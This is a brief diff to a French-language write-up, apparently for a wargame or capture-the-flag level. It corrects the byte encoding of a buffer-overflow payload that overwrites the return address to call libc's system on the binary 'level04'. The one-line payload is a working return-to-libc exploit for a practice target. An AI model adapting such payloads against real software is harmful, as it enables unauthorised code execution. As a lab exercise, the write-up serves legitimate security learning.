@@ -73,7 +73,7 @@ python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\x
 ### 5. Exploitation avec `system` (car `execve()` est bloqué par `ptrace`)
 
 ```bash
-(python -c 'print "A"*156 + "Ð®æ÷" + "pëå÷" + "ìø÷"'; cat) | ./level04
+(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level04
 ```
 
 ---
